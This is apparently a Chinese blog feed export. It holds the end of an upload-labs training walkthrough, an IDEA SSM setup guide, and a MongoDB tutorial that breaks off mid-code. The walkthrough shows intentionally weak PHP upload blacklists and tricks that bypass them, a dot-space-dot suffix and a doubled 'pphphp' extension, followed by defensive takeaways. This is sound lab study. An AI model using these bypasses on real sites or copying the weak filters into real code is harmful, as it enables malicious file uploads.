<p>黑名单类型，有大小写处理，去::$DATA处理，首尾去空处理，去点处理。但是这里的代码逻辑是先删除文件末尾的点，再进行首尾去空。都只进行一次。所以可以在后缀名中加上点空格点绕过。</p>
<p>上传时，代码会先将末尾的.去除，剩余.+空格，利用windows文件命名规则，windows会忽略文件末尾的.和空格。</p>
<h2 id="2-绕过方法-4"><a href="#2-绕过方法-4" class="headerlink" title="2.绕过方法"></a>2.绕过方法</h2><p>使用burpsuite改包</p>
<p><img src="https://s3.ax1x.com/2020/11/17/DV4VzR.jpg" alt="DV4VzR.jpg" style="zoom:67%;" /></p>
<h1 id="PASS-10（双写绕过）"><a href="#PASS-10（双写绕过）" class="headerlink" title="PASS-10（双写绕过）"></a>PASS-10（双写绕过）</h1><h2 id="1-分析-9"><a href="#1-分析-9" class="headerlink" title="1.分析"></a>1.分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">&quot;&quot;</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th>str_ireplace()函数</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>功能</td>
<td>替换字符串中的一些字符（不区分大小写）。</td>
</tr>
</tbody>
</table>
</div>
<p>这里将文件的后缀名替换为空，于是可以利用双写绕过。</p>
<h2 id="2-绕过方法-5"><a href="#2-绕过方法-5" class="headerlink" title="2.绕过方法"></a>2.绕过方法</h2><p>我们可以使用双写后缀绕过，如果将后缀改为pphphp，服务器端检出到中间的php会替换为空，剩下的正好组成php，但是改为pphhpp就不行，源代码只会把第一次出现相连的php替换为空。</p>
<p><img src="https://s3.ax1x.com/2020/11/17/DZr4Zd.jpg" alt="DZr4Zd.jpg" style="zoom: 67%;" /></p>
<h1 id="前十关总结"><a href="#前十关总结" class="headerlink" title="前十关总结"></a>前十关总结</h1><p>做了十关，我得到了一些结论，如果想要做好防御，开发的时候必须考虑：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>1.使用trim()函数移除字符串两端的空白字符或其他预定义字符</td>
<td></td>
</tr>
<tr>
<td>2.使用deldot()函数删除文件名末尾的点</td>
<td></td>
</tr>
<tr>
<td>3.使用strtolow()函数将字符转为小写</td>
<td></td>
</tr>
<tr>
<td>4.去除::$DATA字符串</td>
<td></td>
</tr>
<tr>
<td>5.使用trim()首尾去空</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>网络安全知识学习</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>使用IDEA搭建SSM框架</title>
    <url>/post/e2e0c666.html</url>
    <content><![CDATA[<p>　　刚学习过SSM，记录一下如何创建项目<span id="more"></span></p>
<h1 id="IDEA新建项目"><a href="#IDEA新建项目" class="headerlink" title="IDEA新建项目"></a>IDEA新建项目</h1><h2 id="1-创建Maven工程"><a href="#1-创建Maven工程" class="headerlink" title="1.创建Maven工程"></a>1.创建Maven工程</h2><p><img src="https://s3.ax1x.com/2020/11/29/DcELCT.md.jpg" alt="DcELCT.md.jpg"></p>
<h2 id="2-填写GroupID和ArtifactId"><a href="#2-填写GroupID和ArtifactId" class="headerlink" title="2.填写GroupID和ArtifactId"></a>2.填写GroupID和ArtifactId</h2><p><img src="https://s3.ax1x.com/2020/11/29/DcEO8U.jpg" alt="DcEO8U.jpg"></p>
<h2 id="3-填写项目名称"><a href="#3-填写项目名称" class="headerlink" title="3.填写项目名称"></a>3.填写项目名称</h2><p><img src="https://s3.ax1x.com/2020/11/29/DcEX2F.md.jpg" alt="DcEX2F.md.jpg"></p>
<h2 id="4-刚建好的只是一个Maven目录"><a href="#4-刚建好的只是一个Maven目录" class="headerlink" title="4.刚建好的只是一个Maven目录"></a>4.刚建好的只是一个Maven目录</h2><p><img src="https://s3.ax1x.com/2020/11/29/DcEjv4.jpg" alt="DcEjv4.jpg"></p>
<p>最后再完善目录结构，添加webapp、WEB-INF、web.xml文件就可以了</p>
]]></content>
      <categories>
        <category>javaWeb学习</category>
      </categories>
      <tags>
        <tag>SSM</tag>
      </tags>
  </entry>
  <entry>
    <title>十次方项目-day02</title>
    <url>/post/9c7e5fb.html</url>
    <content><![CDATA[<p>　　十次方项目的第二天，知道什么是MongoDB，并且在电脑上安装使用。使用代码实现MongoDB的增删改查。<span id="more"></span></p>
<h1 id="使用MongoDB和评论管理"><a href="#使用MongoDB和评论管理" class="headerlink" title="使用MongoDB和评论管理"></a>使用MongoDB和评论管理</h1><h2 id="1-MongoDB简介"><a href="#1-MongoDB简介" class="headerlink" title="1 MongoDB简介"></a>1 MongoDB简介</h2><h3 id="1-1-文章评论数据分析"><a href="#1-1-文章评论数据分析" class="headerlink" title="1.1 文章评论数据分析"></a>1.1 文章评论数据分析</h3><p>文章评论功能存在以下特点：</p>
<p>​    1. 数据量大</p>
<p>​    2. 写入操作频繁</p>
<p>​    3. 价值较低</p>
<p>这样的数据，更适合使用MongoDB来实现数据的存储</p>
<h3 id="1-2-什么是MongoDB"><a href="#1-2-什么是MongoDB" class="headerlink" title="1.2 什么是MongoDB"></a>1.2 什么是MongoDB</h3><p> 　　MongoDB是一个基于分布式文件存储的数据库。由C++语言编写。旨在为WEB应用提供可扩展的高性能数据存储解决方案。 MongoDB是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。它支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。</p>
<h3 id="1-3-MongoDB特点"><a href="#1-3-MongoDB特点" class="headerlink" title="1.3  MongoDB特点"></a>1.3  MongoDB特点</h3><p>　　Mongo最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引。</p>
<p>它的特点是高性能、易部署、易使用，存储数据非常方便。主要功能特性有：</p>
<ol>
<li>面向集合存储，易存储对象类型的数据。</li>
<li>模式自由。</li>
<li>支持动态查询。</li>
<li>支持完全索引，包含内部对象。</li>
<li>支持查询。</li>
<li>支持复制和故障恢复。</li>
<li>使用高效的二进制数据存储，包括大型对象（如视频等）。</li>
<li>自动处理碎片，以支持云计算层次的扩展性。</li>
<li>支持RUBY，PYTHON，JAVA，C++，PHP，C#等多种语言。</li>
<li>文件存储格式为BSON（一种JSON的扩展）。</li>
</ol>
<h3 id="1-4-MongoDB体系结构"><a href="#1-4-MongoDB体系结构" class="headerlink" title="1.4 MongoDB体系结构"></a>1.4 MongoDB体系结构</h3><p>　　MongoDB的逻辑结构是一种层次结构，主要由：文档（document）、集合（collection）、数据库（databases）三部分组成。逻辑结构是面向用户的，用户使用MongoDB开发应用程序使用的就是逻辑结构。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>MongoDB</th>
<th>MySQL</th>
</tr>
</thead>
<tbody>
<tr>
<td>数据库（databases）</td>
<td>数据库（databases）</td>
</tr>
<tr>
<td>集合（collection）</td>
<td>表（table）</td>
</tr>
<tr>
<td>文档（document）</td>
<td>行（row）</td>
</tr>
</tbody>
</table>
</div>
<h3 id="1-5-MongoDB数据类型"><a href="#1-5-MongoDB数据类型" class="headerlink" title="1.5 MongoDB数据类型"></a>1.5 MongoDB数据类型</h3><div class="table-container">
<table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>String</td>
<td>字符串。存储数据常用的数据类型。在  MongoDB 中，UTF-8 编码的字符串才是合法的。</td>
</tr>
<tr>
<td>Integer</td>
<td>整型数值。用于存储数值。根据你所采用的服务器，可分为  32 位或 64 位。</td>
</tr>
<tr>
<td>Boolean</td>
<td>布尔值。用于存储布尔值（真/假）。</td>
</tr>
<tr>
<td>Double</td>
<td>双精度浮点值。用于存储浮点值。</td>
</tr>
<tr>
<td>Array</td>
<td>用于将数组或列表或多个值存储为一个键。</td>
</tr>
<tr>
<td>Timestamp</td>
<td>时间戳。记录文档修改或添加的具体时间。</td>
</tr>
<tr>
<td>Object</td>
<td>用于内嵌文档。</td>
</tr>
<tr>
<td>Null</td>
<td>用于创建空值。</td>
</tr>
<tr>
<td>Date</td>
<td>日期时间。用  UNIX 时间格式来存储当前日期或时间。你可以指定自己的日期时间：创建 Date 对象，传入年月日信息。</td>
</tr>
<tr>
<td>Object  ID</td>
<td>对象  ID。用于创建文档的 ID。</td>
</tr>
<tr>
<td>Binary  Data</td>
<td>二进制数据。用于存储二进制数据。</td>
</tr>
<tr>
<td>Code</td>
<td>代码类型。用于在文档中存储  JavaScript 代码。</td>
</tr>
<tr>
<td>Regular  expression</td>
<td>正则表达式类型。用于存储正则表达式。</td>
</tr>
</tbody>
</table>
</div>
<p>特殊说明：</p>
<ol>
<li><p>ObjectId</p>
<p>ObjectId 类似唯一主键，可以很快的去生成和排序，包含 12 bytes，含义是：</p>
<ul>
<li><p>前 4 个字节表示创建 unix 时间戳，格林尼治时间 UTC 时间，比北京时间晚了 8 个小时</p>
</li>
<li><p>接下来的 3 个字节是机器标识码</p>
</li>
<li><p>紧接的两个字节由进程 id 组成 PID</p>
</li>
<li><p>最后三个字节是随机数</p>
</li>
</ul>
</li>
</ol>
<p>   day-02</p>
<p>   MongoDB 中存储的文档必须有一个 _id 键。这个键的值可以是任何类型的，默认是个 ObjectId 对象</p>
<ol>
<li><p>时间戳</p>
<p>BSON 有一个特殊的时间戳类型，与普通的日期类型不相关。时间戳值是一个 64 位的值。其中：</p>
<ul>
<li>前32位是一个 time_t 值【与Unix新纪元（1970年1月1日）相差的秒数】</li>
<li>后32位是在某秒中操作的一个递增的序数</li>
</ul>
<p>在单个 mongod 实例中，时间戳值通常是唯一的。</p>
</li>
<li><p>日期</p>
<p>表示当前距离 Unix新纪元（1970年1月1日）的毫秒数。日期类型是有符号的, 负数表示 1970 年之前的日期。</p>
</li>
</ol>
<h2 id="2-MongoDB基本使用"><a href="#2-MongoDB基本使用" class="headerlink" title="2 MongoDB基本使用"></a>2 MongoDB基本使用</h2><ul>
<li><p>启动</p>
<p>1.创建文件夹data，用于存放数据的目录</p>
<p>2.打开命令行窗口执行：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">mongod <span class="attribute">--dbpath</span>=D:\data</span><br></pre></td></tr></table></figure>
<p>启动信息中默认端口号是27017，想要改变端口</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">mongod <span class="attribute">--dpath</span>=D:\data -port 8989</span><br></pre></td></tr></table></figure>
</li>
<li><p>登录</p>
<p>再打开一个窗口执行</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">mongo <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">27017</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>退出</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="2-1-常用命令"><a href="#2-1-常用命令" class="headerlink" title="2.1 常用命令"></a>2.1 常用命令</h3><h4 id="2-1-1-选择和创建数据库"><a href="#2-1-1-选择和创建数据库" class="headerlink" title="2.1.1 选择和创建数据库"></a>2.1.1 选择和创建数据库</h4><p>选择和创建数据库的语法格式：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> 数据库名称</span><br></pre></td></tr></table></figure>
<p>如果数据库存在则选择该数据库，如果数据库不存在则自动创建。以下语句创建commentdb数据库：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> commentdb</span><br></pre></td></tr></table></figure>
<p>查看数据库：</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs</span><br></pre></td></tr></table></figure>
<p>查看集合,需要先选择数据库之后，才能查看该数据库的集合：</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> collections</span><br></pre></td></tr></table></figure>
<h4 id="2-1-2-插入与查询文档"><a href="#2-1-2-插入与查询文档" class="headerlink" title="2.1.2 插入与查询文档"></a>2.1.2 插入与查询文档</h4><p>选择数据库后，使用集合来对文档进行操作，插入文档语法格式：</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">db.集合名称.insert(数据)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>插入以下测试数据：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.insert</span>(&#123;<span class="attribute">content</span>:<span class="string">&quot;十次方课程&quot;</span>,userid:<span class="string">&quot;1011&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
<p>查询集合的语法格式：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">db.集合名称.<span class="builtin-name">find</span>()</span><br></pre></td></tr></table></figure>
<p>查询spit集合的所有文档，输入以下命令：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.find</span>()</span><br></pre></td></tr></table></figure>
<p>​    发现文档会有一个叫_id的字段，这个相当于我们原来关系数据库中表的主键，当你在插入文档记录时没有指定该字段，MongoDB会自动创建，其类型是ObjectID类型。如果我们在插入文档记录时指定该字段也可以，其类型可以是ObjectID类型，也可以是MongoDB支持的任意类型。</p>
<p>输入以下测试语句:</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.insert</span>(&#123;<span class="attribute">_id</span>:<span class="string">&quot;1&quot;</span>,content:<span class="string">&quot;到底为啥出错&quot;</span>,userid:<span class="string">&quot;1012&quot;</span>,thumbup:<span class="number">2020</span>&#125;);</span><br><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.insert</span>(&#123;<span class="attribute">_id</span>:<span class="string">&quot;2&quot;</span>,content:<span class="string">&quot;加班到半夜&quot;</span>,userid:<span class="string">&quot;1013&quot;</span>,thumbup:<span class="number">1023</span>&#125;);</span><br><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.insert</span>(&#123;<span class="attribute">_id</span>:<span class="string">&quot;3&quot;</span>,content:<span class="string">&quot;手机流量超了咋办&quot;</span>,userid:<span class="string">&quot;1013&quot;</span>,thumbup:<span class="number">111</span>&#125;);</span><br><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.insert</span>(&#123;<span class="attribute">_id</span>:<span class="string">&quot;4&quot;</span>,content:<span class="string">&quot;坚持就是胜利&quot;</span>,userid:<span class="string">&quot;1014&quot;</span>,thumbup:<span class="number">1223</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>按一定条件来查询，比如查询userid为1013的记录，只要在find()中添加参数即可，参数也是json格式，如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.find</span>(&#123;<span class="attribute">userid</span>:<span class="string">&#x27;1013&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>
<p>只需要返回符合条件的第一条数据，我们可以使用findOne命令来实现：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.findOne</span>(&#123;<span class="attribute">userid</span>:<span class="string">&#x27;1013&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>
<p>返回指定条数的记录，可以在find方法后调用limit来返回结果，例如：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.find</span>()<span class="selector-class">.limit</span>(2)</span><br></pre></td></tr></table></figure>
<h4 id="2-1-3-修改与删除文档"><a href="#2-1-3-修改与删除文档" class="headerlink" title="2.1.3 修改与删除文档"></a>2.1.3 修改与删除文档</h4><p>修改文档的语法结构：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">db</span>.集合名称.<span class="keyword">update</span>(条件,修改后的数据)</span><br></pre></td></tr></table></figure>
<p>修改_id为1的记录，点赞数为1000，输入以下语句：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.update</span>(&#123;<span class="attribute">_id</span>:<span class="string">&quot;1&quot;</span>&#125;,&#123;<span class="attribute">thumbup</span>:<span class="number">1000</span>&#125;)</span><br></pre></td></tr></table></figure>
<p>执行后发现，这条文档除了thumbup字段其它字段都不见了。</p>
<p>为了解决这个问题，我们需要使用修改器$set来实现，命令如下：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.update</span>(&#123;<span class="attribute">_id</span>:<span class="string">&quot;2&quot;</span>&#125;,&#123;$<span class="attribute">set</span>:&#123;<span class="attribute">thumbup</span>:<span class="number">2000</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>
<p>删除文档的语法结构：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">db.集合名称.<span class="builtin-name">remove</span>(条件)</span><br></pre></td></tr></table></figure>
<p>以下语句可以将数据全部删除，<font color="ff0000">慎用~</font></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.remove</span>(&#123;&#125;)</span><br></pre></td></tr></table></figure>
<p>删除条件可以放到大括号中，例如删除thumbup为1000的数据，输入以下语句：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.remove</span>(&#123;<span class="attribute">thumbup</span>:<span class="number">1000</span>&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="2-1-4-统计条数"><a href="#2-1-4-统计条数" class="headerlink" title="2.1.4 统计条数"></a>2.1.4 统计条数</h4><p>统计记录条件使用count()方法。以下语句统计spit集合的记录数：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.count</span>()</span><br></pre></td></tr></table></figure>
<p>按条件统计 ，例如统计userid为1013的记录条数：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.count</span>(&#123;<span class="attribute">userid</span>:<span class="string">&quot;1013&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="2-1-5-模糊查询"><a href="#2-1-5-模糊查询" class="headerlink" title="2.1.5 模糊查询"></a>2.1.5 模糊查询</h4><p>MongoDB的模糊查询是通过正则表达式的方式实现的。格式为：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/模糊查询字符串/</span></span><br></pre></td></tr></table></figure>
<p>查询评论内容包含“流量”的所有文档，代码如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.find</span>(&#123;<span class="attribute">content</span>:/流量/&#125;)</span><br></pre></td></tr></table></figure>
<p>查询评论内容中以“加班”开头的，代码如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.find</span>(&#123;<span class="attribute">content</span>:/^加班/&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="2-1-6-大于-小于-不等于"><a href="#2-1-6-大于-小于-不等于" class="headerlink" title="2.1.6 大于 小于 不等于"></a>2.1.6 大于 小于 不等于</h4><p>&lt;, &lt;=, &gt;, &gt;= 这个操作符也是很常用的，格式如下:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">db.集合名称.find(&#123; <span class="string">&quot;field&quot;</span> : &#123; <span class="variable">$gt</span>: value &#125;&#125;) <span class="regexp">//</span> 大于: field &gt; value</span><br><span class="line">db.集合名称.find(&#123; <span class="string">&quot;field&quot;</span> : &#123; <span class="variable">$lt</span>: value &#125;&#125;) <span class="regexp">//</span> 小于: field &lt; value</span><br><span class="line">db.集合名称.find(&#123; <span class="string">&quot;field&quot;</span> : &#123; <span class="variable">$gte</span>: value &#125;&#125;) <span class="regexp">//</span> 大于等于: field &gt;= value</span><br><span class="line">db.集合名称.find(&#123; <span class="string">&quot;field&quot;</span> : &#123; <span class="variable">$lte</span>: value &#125;&#125;) <span class="regexp">//</span> 小于等于: field &lt;= value</span><br><span class="line">db.集合名称.find(&#123; <span class="string">&quot;field&quot;</span> : &#123; <span class="variable">$ne</span>: value &#125;&#125;) <span class="regexp">//</span> 不等于: field != value</span><br></pre></td></tr></table></figure>
<p>查询评论点赞数大于1000的记录：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.find</span>(&#123;<span class="attribute">thumbup</span>:&#123;$gt:<span class="number">1000</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="2-1-7-包含与不包含"><a href="#2-1-7-包含与不包含" class="headerlink" title="2.1.7 包含与不包含"></a>2.1.7 包含与不包含</h4><p>包含使用$in操作符</p>
<p>查询评论集合中userid字段包含1013和1014的文档：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.find</span>(&#123;<span class="attribute">userid</span>:&#123;$in:[<span class="string">&quot;1013&quot;</span>,<span class="string">&quot;1014&quot;</span>]&#125;&#125;)</span><br></pre></td></tr></table></figure>
<p>不包含使用$nin操作符</p>
<p>查询评论集合中userid字段不包含1013和1014的文档：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.find</span>(&#123;<span class="attribute">userid</span>:&#123;$nin:[<span class="string">&quot;1013&quot;</span>,<span class="string">&quot;1014&quot;</span>]&#125;&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="2-1-8-条件连接"><a href="#2-1-8-条件连接" class="headerlink" title="2.1.8 条件连接"></a>2.1.8 条件连接</h4><p>我们如果需要查询同时满足两个以上条件，需要使用$and操作符将条件进行关联（相当于SQL的and）。格式为：</p>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">$and:[ </span><span class="template-variable">&#123;条件&#125;</span><span class="xml">,</span><span class="template-variable">&#123;条件&#125;</span><span class="xml">,</span><span class="template-variable">&#123;条件&#125;</span><span class="xml"> ]</span></span><br></pre></td></tr></table></figure>
<p>查询评论集合中thumbup大于等于1000 并且小于2000的文档：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">db.comment.find(&#123;<span class="attr">$and:</span>[ &#123;<span class="attr">thumbup:</span>&#123;<span class="attr">$gte:</span><span class="number">1000</span>&#125;&#125; ,&#123;<span class="attr">thumbup:</span>&#123;<span class="attr">$lt:</span><span class="number">2000</span>&#125; &#125;]&#125;)</span><br></pre></td></tr></table></figure>
<p>如果两个以上条件之间是或者的关系，我们使用操作符进行关联，与前面and的使用方式相同，格式为：</p>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">$or:[ </span><span class="template-variable">&#123;条件&#125;</span><span class="xml">,</span><span class="template-variable">&#123;条件&#125;</span><span class="xml">,</span><span class="template-variable">&#123;条件&#125;</span><span class="xml"> ]</span></span><br></pre></td></tr></table></figure>
<p>查询评论集合中userid为1013，或者点赞数小于2000的文档记录：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">db.comment.find(&#123;<span class="attr">$or:</span>[ &#123;<span class="attr">userid:</span><span class="string">&quot;1013&quot;</span>&#125; ,&#123;<span class="attr">thumbup:</span>&#123;<span class="attr">$lt:</span><span class="number">2000</span>&#125; &#125;]&#125;)</span><br></pre></td></tr></table></figure>
<h4 id="2-1-9-列值增长"><a href="#2-1-9-列值增长" class="headerlink" title="2.1.9 列值增长"></a>2.1.9 列值增长</h4><p>对某列值在原有值的基础上进行增加或减少，可以使用$inc运算符：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">db</span><span class="selector-class">.comment</span><span class="selector-class">.update</span>(&#123;<span class="attribute">_id</span>:<span class="string">&quot;2&quot;</span>&#125;,&#123;$<span class="attribute">inc</span>:&#123;<span class="attribute">thumbup</span>:<span class="number">1</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="2-2-启动MongoDB"><a href="#2-2-启动MongoDB" class="headerlink" title="2.2 启动MongoDB"></a>2.2 启动MongoDB</h3><ul>
<li>window系统</li>
</ul>
<p><strong>启动</strong></p>
<ol>
<li>创建一个文件夹<code>d:\data</code>，用于存放数据的目录data</li>
<li>打开命令行窗口，执行以下命令</li>
</ol>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">mongod <span class="attribute">--dbpath</span>=D:\data</span><br></pre></td></tr></table></figure>
<p>​    我们在启动信息中可以看到，mongoDB的默认端口是27017，如果我们想改变默认的启动端口，可以通过—port来指定端口，例如</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">mongod <span class="attribute">--dbpath</span>=D:\data -port 8989</span><br></pre></td></tr></table></figure>
<p><strong>登录</strong></p>
<p>再打开一个新的命令行窗口，执行以下命令</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">mongo <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">27017</span></span><br></pre></td></tr></table></figure>
<p>以上命令中，如果ip是本地服务，端口号是27017，则后面的<code>127.0.0.1:27017</code>可以省略</p>
<ul>
<li>Dokcer环境下</li>
</ul>
<p>在Linux虚拟机中创建mongo容器，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -id --name mongo -p 27017:27017 mongo</span><br></pre></td></tr></table></figure>
<p>在Window命令行窗口出入登录命令：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">mongo <span class="number">192.168</span><span class="number">.200</span><span class="number">.131</span></span><br></pre></td></tr></table></figure>
<h2 id="3-MongoDB在代码中的使用"><a href="#3-MongoDB在代码中的使用" class="headerlink" title="3 MongoDB在代码中的使用"></a>3 MongoDB在代码中的使用</h2><h3 id="3-1-查询所有"><a href="#3-1-查询所有" class="headerlink" title="3.1 查询所有"></a>3.1 查询所有</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MongoDBTest</span></span>&#123;</span><br><span class="line">    <span class="comment">//客户端</span></span><br><span class="line">    <span class="keyword">private</span> MongoClient mongoClient;</span><br><span class="line">    <span class="comment">//集合</span></span><br><span class="line">    <span class="keyword">private</span> MongoCollection&lt;Document&gt; comment</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Before</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 1.创建操作MongoDB的客户端</span></span><br><span class="line">        mongoClient = <span class="keyword">new</span> MongoClient(<span class="string">&quot;&quot;</span><span class="number">192.168</span>.<span 